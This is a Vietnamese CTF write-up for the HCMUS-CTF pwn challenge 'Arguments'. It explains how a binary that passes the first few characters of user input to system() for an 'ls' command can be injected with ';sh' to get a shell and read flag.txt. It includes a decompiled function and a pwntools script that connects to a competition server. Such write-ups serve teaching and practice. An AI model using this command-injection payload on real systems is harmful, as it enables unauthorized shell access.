## ⚡ [Arguments](https://ctf.hcmus.edu.vn/challenges#Arguments)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/128-pts-brightgreen.svg)](https://img.shields.io/badge/128-pts-brightgreen.svg)

Tác giả: `pakkunandy`



Tags: `pwn` `shell`

<!--
### Challenge Description
-->

### Summary

Challenge này yêu cầu ta lấy được môi trường thực thi trên server.

Đầu tiên, kiểm tra thông tin binary:

```bash
$ checksec arguments
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Chương trình này chạy trên nhân x64, đã bật toàn bộ các bảo vệ.

Chạy thử chương trình:

```bash
$ ./arguments
We will execute `ls` command, please give us your arguments!
-l
Your output of the command `ls -l`:
total 12
-rwxrwxrwx 1 viplazylmht viplazylmht 3432 Sep 29 09:26 README.md
-rwxrwxrwx 1 viplazylmht viplazylmht  198 Sep 29 09:15 arg.py
-rwxrwxrwx 1 viplazylmht viplazylmht 8792 Sep 26 11:08 arguments
-rwxrwxrwx 1 viplazylmht viplazylmht   28 Sep 29 09:20 flag.txt
Goodbye!
```
Chương trình yêu cầu ta nhập tham số cho câu lệnh `ls`, dùng để liệt kê các tập tin trong thư mục hiện hành.
Tuy nhiên, thứ ta cần là nội dung trong file `flag.txt`, vì vậy thử dùng trick để chạy 2 lệnh shell trên cùng 1 dòng:

```bash
$ echo ";cat flag.txt" | ./arguments
We will execute `ls` command, please give us your arguments!
Your output of the command `ls ;ca`:
README.md  arg.py  arguments  flag.txt
sh: 1: ca: not found
Goodbye!
```

Dễ thấy, challenge này đã có filter riêng để lọc input, cụ thể là chỉ lấy 3 kí tự đầu tiên được xây dựng trong hàm show_me.

```cpp 
__int64 show_me()
{
  ...
  puts("We'will execute `ls` command, please give us your arguments!");
  gets(&s);
  if ( strchr(&s, 47) ) v2 = puts("Slashes denied!!");
  else
  {
    snprintf(&command, 7uLL, "ls %s", &s);
    printf("Your output of the command `%s`: \n", &command);
    v2 = system(&command);
  }
  puts("Goodbye!");
  ...
}
```
Vậy cần 1 `payload` có độ dài 3 kí tự, trong đó kí tự đầu tiên là `;` để ngắt lệnh đầu tiên. 

### Exploit

Có nhiều lệnh có độ dài 2 kí tự ví dụ như `vi` hay `sh`, nhưng vì server đã được chạy trên một `virtualenv` riêng, nên ta sẽ chọn một lệnh được cung cấp sẵn trên server:

```bash
$ echo "bin" | ./arguments
We will execute `ls` command, please give us your arguments!
Your output of the command `ls bin`:
sh cat
Goodbye!
```

Xây dựng payload:

```python
payload = ";" + "sh"
```

Với lệnh `sh`, ta sẽ lấy được quyền thực thi shell trên môi trường máy chủ, từ đó đọc được nội dung flag.

## Code

```python
#!/usr/bin/env python3
from pwn import *

p = remote("159.65.13.76", 62112)
#p = process("./arguments")

p.recvuntil("ts!")
payload = ";sh"

p.sendline(payload)

p.sendline("cat flag.txt;exit")
p.interactive()
```


📫 Flag: **`HCMUS-CTF{}`**

---
*[Back to table of contents](../README.md)*
